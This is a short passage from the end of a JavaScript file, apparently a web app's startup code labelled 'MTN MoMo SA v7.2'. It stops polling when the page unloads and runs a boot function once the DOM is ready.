    window.addEventListener('beforeunload', function () {
        stopPolling();
        stopRegPoll();
    });

    console.log('✅ MTN MoMo SA v7.2 ready');
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
} else {
    boot();
}
